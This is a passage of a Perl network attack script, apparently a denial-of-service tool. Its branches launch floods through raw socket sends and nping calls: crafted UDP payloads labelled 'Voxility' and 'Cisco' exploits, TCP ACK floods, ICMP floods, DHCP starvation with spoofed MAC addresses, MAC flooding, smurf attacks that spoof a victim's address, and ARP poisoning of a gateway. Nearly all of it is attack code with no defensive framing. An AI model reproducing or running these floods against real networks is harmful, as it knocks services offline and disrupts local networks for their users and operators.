8\x97\xbf\xaa\x56\x26\x21\x4e\x64\x55\x3d\x36\xd5\x66\xaf\x2f\xc8\x8d\xe2\x44\xaf\x7f\x5a\xac\x20\x0c\x93\x72\x07\x6a\x63\xe8\x7f\xf6\x2b\xc6\x14\x79\x47\x7a\x61\x99\x00\x3c\xcb\xeb\x3b\x7f\x9d\x9f\xf8\x6b\x1e\xc9\x20\x38\x13\x78\x17\x33\xca\xbe\xf7\xcb\x27\x1a\xf3\xd7\x04\xe4\x2b\x0a\x95\xaa\x42\x4a\x2b\x16\x7c\xf9\x16\xdb\x1f\xb9\x83\xab\xf1\x82\x2a\x1b\xd6\xdc\xd8\xb3\x8c\x9c\x3e\x60\xd3\x8d\x95\xeb\x03\xfc\xb8\xa6\x07\x08\x8c\x2b\xeb\xbd\x50\x94\x89\x4d\x28\x61\xff\x6c\xe8\x7b\x12\x9f\x14\xaf\x24\xb0\x8f\x09\x05\xc6\xe6\x2a\xff\x58\x1a\xa9\x1c\x03\x2e\x28\x24\x16\x4a\x37\xb4\x23\x3c\x03\xa5\xfa\x0c\x2f\x99\x84\x78\x21\x01\x32\xd0\x78\x61\x3b\x6c\x42\x1e\xa3\x9c\x43\xf8\x66\xf5\x75\x62\x0c\x76\xeb\x6c\x1c\x3e\xba\x9b\x7c\x04\x27\xfc\xb3\x9a\xcf\xb0\xa5\x55\x72\xf7\xcf\x73\xa8\xe6\x68\x85\x5a\xa1\x42\x23\xf8\x81\x91\xc4\xc7\x3c\x30\xf5\x33\x41\xcd\x23\xb2\x20\x99\x11\xa3\xa8\x0b\xed\x8d\x75\x34\x21\xfa\x4d\xc6\xca\xa7\x2d\xab\xb9\x3b\xa2\xf5\x60\x48\xd4\xec\xe3\x6c\xaa\x05\x1e\x65\xcb\xb4\xc2\x43\x47\x24\x4b\xa5\xdd\x54\x0c\x47\x8f\xef\xdd\xf0\x3b\xd9\x8b\xbf\xa5\xd6\x87\x28\x8d\x78\x7f\x96\xc7\x20\xbd\x4b\x97\xf9\x84\xd2\xc1\x92\xce\x7f\x1d\x6d\x7a\xe8\x0f\x0b\x3e\x38\xeb\x82\xd7\x95\xd8\xe5\xa6\x15\x60\xd7\xed\xc1\x4a\xf2\xf2\x67\x0d\xae\x10\x49\xe6\xc5\x20\x99\x02\x31\x08\xd8\xc2\x0a\xe7\x33\xdf\x00\x7a\x3a\x84\xef\x04\xcf\x4b\x91\x1e\xea\xc1\xfa\x57\x80\x40" , 0, pack_sockaddr_in($sslvpnudpport, $iaddr));
	send(flood, "\xf1\x6e\x9d\x64\xe8\x5d\xdd\xe6\x07\x78\x5b\x6c\x40\x10\x70\x15\x4e\x51\x18\x9c\x4b\xee\x5d\x30\x39\xd4\xa3\xd8\x22" , 0, pack_sockaddr_in($sslvpnudpport, $iaddr)); 
  }
  
  if($l2tpudpport == "Y") {
    send(flood, "\x7d\x96\x70\xcd\xc9\x0e\x03\x68\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x01\x98\x0d\x00\x00\xd4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\xc8\x01\x01\x00\x05\x03\x00\x00\x28\x01\x01\x00\x00\x80\x01\x00\x07\x80\x0e\x01\x00\x80\x02\x00\x02\x80\x04\x00\x14\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x70\x80\x03\x00\x00\x28\x02\x01\x00\x00\x80\x01\x00\x07\x80\x0e\x00\x80\x80\x02\x00\x02\x80\x04\x00\x13\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x70\x80\x03\x00\x00\x28\x03\x01\x00\x00\x80\x01\x00\x07\x80\x0e\x01\x00\x80\x02\x00\x02\x80\x04\x00\x0e\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x70\x80\x03\x00\x00\x24\x04\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x04\x00\x0e\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x70\x80\x00\x00\x00\x24\x05\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x04\x00\x02\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x70\x80\x0d\x00\x00\x18\x01\x52\x8b\xbb\xc0\x06\x96\x12\x18\x49\xab\x9a\x1c\x5b\x2a\x51\x00\x00\x00\x01\x0d\x00\x00\x18\x1e\x2b\x51\x69\x05\x99\x1c\x7d\x7c\x96\xfc\xbf\xb5\x87\xe4\x61\x00\x00\x00\x09\x0d\x00\x00\x14\x4a\x13\x1c\x81\x07\x03\x58\x45\x5c\x57\x28\xf2\x0e\x95\x45\x2f\x0d\x00\x00\x14\x90\xcb\x80\x91\x3e\xbb\x69\x6e\x08\x63\x81\xb5\xec\x42\x7b\x1f\x0d\x00\x00\x14\x40\x48\xb7\xd5\x6e\xbc\xe8\x85\x25\xe7\xde\x7f\x00\xd6\xc2\xd3\x0d\x00\x00\x14\xfb\x1d\xe3\xcd\xf3\x41\xb7\xea\x16\xb7\xe5\xbe\x08\x55\xf1\x20\x0d\x00\x00\x14\x26\x24\x4d\x38\xed\xdb\x61\xb3\x17\x2a\x36\xe3\xd0\xcf\xb8\x19\x00\x00\x00\x14\xe3\xa5\x96\x6a\x76\x37\x9f\xe7\x07\x22\x82\x31\xe5\xce\x86\x52" , 0, pack_sockaddr_in("500", $iaddr)); 
   
   }
   else
   {

   }
  

} 
} # no delete error


elsif($method eq "ux1") {
print "[*] Using Voxility Exploit\n";
for (;time() <= $endtime;) {
  $packets = $packets + 1;
   
 send("flood", "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00", 0, pack_sockaddr_in("161", $iaddr));
	print "Packets send -> " . $packets . "\r";

  } 
}

elsif($method eq "ux2") {
print "[*] Using Cisco Exploit\n";

for (;time() <= $endtime;) {

   
 $psize = int(rand(1024-64)+126) ;

   
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(69, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(500, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(514, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(4500, $iaddr));
  send(flood, "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize", 0, pack_sockaddr_in(8200, $iaddr));



  } 
}

elsif($method eq "t1") {
print "[*] Using ZeroACK\n";

for (;time() <= $endtime;) {

  my ($tempport,$tempwin,$tempseq,$tempack);
  $tempport = int(rand(20535)+45000);
  $tempwin = int(rand(65535));
  $tempseq = int(rand(4294967295));
  $tempack = int(rand(4294967295));

   print ("[ INFO  ] SrcPort " . $tempport . "		WIN " . $tempwin . "	SEQ " . $tempseq . "		ACK " . $tempack . "\n");
  system("nping -tcp -c 5500 -delay 0ms -rate 999999 -flags ACK,CWR,ECN,URG -data-length 1400 -tos 59 -g rand -p 0 -win " . $tempwin . " -seq " . $tempseq . " -ack " . $tempack . " -q4 " . $ip);


  } 
}

elsif($method eq "i1") {
print "[*] Using Junk Echo\n";

for (;time() <= $endtime;) {

  my ($tempcode,$tempttl,$tempseq,$tempid);
  $tempcode = int(rand(255));
  $tempttl = int(rand(191)+64);
  $tempseq = int(rand(65535));
  $tempid = int(rand(65535));
  
  print ("[ INFO  ] CODE " . $tempcode . "	TTL " . $tempttl . "		SEQ " . $tempseq . "	ID " . $tempid . "\n");
  system("nping -icmp -delay 0ms -rate 999999 -c 5500 -data-length 1400 -icmp-code " . $tempcode . " -ttl " . $tempttl . " -icmp-seq " . $tempseq . " -icmp-id " . $tempid . " -q4 " . $ip);

  } 
}


elsif($method eq "i2") {
print "[*] Using Junk Timestamp\n";

for (;time() <= $endtime;) {

  my ($tempcode,$tempttl,$tempseq,$tempid);
  $tempcode = int(rand(255));
  $tempttl = int(rand(191)+64);
  $tempseq = int(rand(65535));
  $tempid = int(rand(65535));
  
  print ("[ INFO  ] CODE " . $tempcode . "	TTL " . $tempttl . "		SEQ " . $tempseq . "	ID " . $tempid . "\n");
  system("nping -icmp -icmp-type 13 -delay 0ms -rate 999999 -c 5500 -data-length 1400 -icmp-code " . $tempcode . " -ttl " . $tempttl . " -icmp-seq " . $tempseq . " -icmp-id " . $tempid . " -q4 " . $ip);

  } 
}


elsif($method eq "i3") {
print "[*] Using Junk Information Request\n";

for (;time() <= $endtime;) {

  my ($tempcode,$tempttl,$tempseq,$tempid);
  $tempcode = int(rand(255));
  $tempttl = int(rand(191)+64);
  $tempseq = int(rand(65535));
  $tempid = int(rand(65535));
  
  print ("[ INFO  ] CODE " . $tempcode . "	TTL " . $tempttl . "		SEQ " . $tempseq . "	ID " . $tempid . "\n");
    system("nping -icmp -icmp-type 15 -delay 0ms -rate 999999 -c 5500 -data-length 1400 -icmp-code " . $tempcode . " -ttl " . $tempttl . " -icmp-seq " . $tempseq . " -icmp-id " . $tempid . " -q4 " . $ip);
  } 
}

elsif($method eq "l1") {
my ($tempreaming,$tempgatewayaddress);
print "[+] Gateway IP Address: ";
chop ($tempgatewayaddress = <stdin>);
print "[*] Using DHCP Starvation\n";
$tempreaming = 254;
for (;time() <= $endtime;) {

  my ($tempmachex,$tempmacstring,$tempid,$hexed6,$hexed7,$hexed8,$hexed9,$macb1,$macb2,$macb3,$macb4,$macb5,$macb6,$fakeip);
  
  $hexed = $hex2[rand @hex2];
  $hexed1 = $hex2[rand @hex2];
  $hexed2 = $hex2[rand @hex2];
  $hexed3 = $hex2[rand @hex2];
  $hexed4 = $hex2[rand @hex2];
  $hexed5 = $hex2[rand @hex2];
  $hexed6 = $hex2[rand @hex2];
  $hexed7 = $hex2[rand @hex2];
  $hexed8 = $hex2[rand @hex2];
  $hexed9 = $hex2[rand @hex2];
  
  $macb1 = $hex2[rand @hex2];
  $macb2 = $hex2[rand @hex2];
  $macb3 = $hex2[rand @hex2];
  $macb4 = $hex2[rand @hex2];
  $macb5 = $hex2[rand @hex2];
  $macb6 = $hex2[rand @hex2];
  
  $fakeip = $hex2[rand @hex3];
  
  
  $tempmachex  = $hexed . "" . $hexed1 . "" . $hexed2 . "" . $hexed3 . "" . $hexed4 . "" . $hexed5;
  $tempmacstring = $macb1 . ":" . $macb2 . ":" . $macb3 . ":" . $macb4 . ":" . $macb5 . ":" . $macb6;
  $tempid = $hexed6 . $hexed7 . $hexed8 . $hexed9;
  
  if($tempreaming > 0) {
  $tempreaming = $tempreaming - 1;
   print ("[ INFO  ] FAKE CLIENT MAC " . $tempmacstring . " TRANSACTION ID " . $tempid . " [Probably " . $tempreaming . " reaming] \n");
  }
  else{
  $tempreaming = $tempreaming - 1;
   print ("[ INFO  ] FAKE CLIENT MAC " . $tempmacstring . " TRANSACTION ID " . $tempid . " [Probably 0 reaming]\n");
  
  }
  

  
 
    #system("nping -debug -udp -delay 0ms -rate 999999 -c 1 --source-mac " . $tempmacstring . " --dest-mac ff:ff:ff:ff:ff:ff -data \x01\x01\x06\x00" . $tempid . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . $tempmachex . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x63\x82\x53\x63\x35\x01\x01\x3d\x07\x01" . $tempmachex . "\x39\x02\x05\xdc\x3c\x10\x61\x6e\x64\x72\x6f\x69\x64\x2d\x64\x68\x63\x70\x2d\x37\x2e\x30\x0c\x09" . "\x4e\x41\x53\x41\x2d\x44\x48\x43\x50".	"\x37\x0a\x01\x03\x06\x0f\x1a\x1c\x33\x3a\x3b\x2b\xff -q4 " . $ip);
  system("nping -udp -delay 0ms -rate 999999 -c 1 --source-mac " . $tempmacstring . " --dest-mac ff:ff:ff:ff:ff:ff -data \\x01\\x01\\x06\\x00" . '\\x' . $hexed6 . '\\x' . $hexed7 . '\\x' . $hexed8 . '\\x' . $hexed9 . "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" . $tempmachex . "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x82\\x53\\x63\\x35\\x01\\x01\\x3d\\x07\\x01" . $tempmachex . "\\x39\\x02\\x05\\xdc\\x3c\\x10\\x61\\x6e\\x64\\x72\\x6f\\x69\\x64\\x2d\\x64\\x68\\x63\\x70\\x2d\\x37\\x2e\\x30\\x0c\\x09" . "\\x4e\\x41\\x53\\x41\\x2d\\x44\\x48\\x43\\x50" . "\\x37\\x0a\\x01\\x03\\x06\\x0f\\x1a\\x1c\\x33\\x3a\\x3b\\x2b\\xff -S 0.0.0.0 255.255.255.255 -g 68 -p 67");  
#  system("nping -udp -delay 0ms -rate 999999 -c 1 --source-mac " . $tempmacstring . " --dest-mac ff:ff:ff:ff:ff:ff -data \\x01\\x01\\x06\\x00\\x" . '\\x' . $hexed6 . '\\x' . $hexed7 . '\\x' . $hexed8 . '\\x' . $hexed9 . "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" . $tempmachex . "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x82\\x53\\x63\\x35\\x01\\x03\\x3d\\x07\\x01" . $tempmachex . "\\x32\\x04\\x" . $tempfakeip . "\\x36\\x04" . $tempgatewayaddress . "\\x39\\x02\\x05\\xdc\\x3c\\x10\\x61\\x6e\\x64\\x72\\x6f\\x69\\x64\\x2d\\x64\\x68\\x63\\x70\\x2d\\x37\\x2e\\x30\\x0c\\x09" . "\\x4e\\x41\\x53\\x41\\x2d\\x44\\x48\\x43\\x50" . "\\x37\\x0a\\x01\\x03\\x06\\x0f\\x1a\\x1c\\x33\\x3a\\x3b\\x2b\\xff -S 0.0.0.0 255.255.255.255 -g 68 -p 67 -q4");  
  system("nping -udp -delay 0ms -rate 999999 -c 1 --source-mac " . $tempmacstring . " --dest-mac ff:ff:ff:ff:ff:ff -data \\x01\\x01\\x06\\x00" .'\\x' . $hexed6 . '\\x' . $hexed7 . '\\x' . $hexed8 . '\\x' . $hexed9 . "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" . $tempmachex . "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x82\\x53\\x63\\x35\\x01\\x03\\x3d\\x07\\x01" . $tempmachex . "\\x32\\x04\\x" . "\\xc0\\xa8\\x19\\x" . $fakeip . "\\x36\\x04" . "\\xc0\\xa8\\x19\\x01" . "\\x39\\x02\\x05\\xdc\\x3c\\x10\\x61\\x6e\\x64\\x72\\x6f\\x69\\x64\\x2d\\x64\\x68\\x63\\x70\\x2d\\x37\\x2e\\x30\\x0c\\x0b" . "\\x62\\x31\\x73\\x63\\x6f\\x69\\x74\\x6f\\x20\\x3c\\x33" . "\\x37\\x0a\\x01\\x03\\x06\\x0f\\x1a\\x1c\\x33\\x3a\\x3b\\x2b\\xff -S 0.0.0.0 255.255.255.255 -g 68 -p 67");  

  } 
}

elsif($method eq "l2") {
print "[*] Using MAC Flooding\n";

for (;time() <= $endtime;) {

my ($tempip);
  $tempip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
  
  print ("[ INFO  ] IP " . $tempip . " \n");
  system("nping --source-mac rand --dest-mac rand -S rand -tcp -p %random% -g rand -win 512 -seq rand -delay 0ms -rate 999999 -c 1 -q4 " . $tempip);
  
  } 
}

elsif($method eq "l3") {

my ($tempvictimmac,$tempbroadcastaddress);


print "[+] Victim MAC: ";
chop ($tempvictimmac = <stdin>);
print "[+] Broadcast Address: ";
chop ($tempbroadcastaddress = <stdin>);
print "[*] Using ICMP Smurf\n";
for (;time() <= $endtime;) {

my ($tempip);
  $tempip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
  
  system("nping --source-mac " . $tempvictimmac . " --dest-mac ff:ff:ff:ff:ff:ff -S " . $ip . " -icmp -delay 0ms -rate 999999 -c 5500 -q4 " . $tempbroadcastaddress);
  
  } 
}

elsif($method eq "l4") {

my ($tempgatewayaddress);
print "[+] Gateway IP Address: ";
chop ($tempgatewayaddress = <stdin>);
print "[*] Using ARP Poisoning\n";

for (;time() <= $endtime;) {

  system("nping -arp --arp-sender-mac rand --arp-target-mac ff:ff:ff:ff:ff:ff --arp-sender-ip " . $ip . " --arp-target-ip " . $tempgatewayaddress . " -delay 0ms -rate 999999 -c 5500 -q4 " . $tempgatewayaddress);
  
  } 
}



system("cls");
  #$pps = $packets/$time;
  #print "\n";
  #print "Victim IP -> " . $ip . "\n";
  #print "Victim port -> " . $port . "\n";
  #print "Attack duration -> " . $time . " seconds" . "\n";
  #print "Totall packets send -> " . $packets . "\n";
  #print "Rate PPS -> " . $pps . "\n";